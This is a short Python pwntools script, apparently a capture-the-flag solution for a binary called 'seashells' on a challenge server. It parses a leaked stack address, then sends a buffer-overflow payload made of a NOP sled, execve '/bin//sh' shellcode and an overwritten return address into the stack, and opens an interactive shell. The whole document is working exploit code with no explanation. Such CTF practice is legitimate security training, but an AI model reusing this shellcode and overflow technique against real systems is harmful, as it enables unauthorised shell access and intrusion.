from pwn import *

local = False
fileName = './seashells'
e = ELF(fileName)
context.arch ='amd64'

if local:
    p = process(fileName)
    gdb.attach(p,'''
        b *main+8
    ''')
else:
    p = remote('0.cloud.chals.io',22808)

leak = p.recvline()
leak = leak.split(b'0x')
stack = b'0x' + leak[1]
stack = stack[:-1]
stack = stack.decode()
log.info(f'stack addres: {stack}')
stack = int(stack,16)

shell = b"\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
payload = b'\x90' * (20) + shell + asm('ret')
payload += b'\x90' * (68-(len(payload)))
payload += p64(stack+20)


print(len(payload))
p.sendline(payload)
p.interactive()

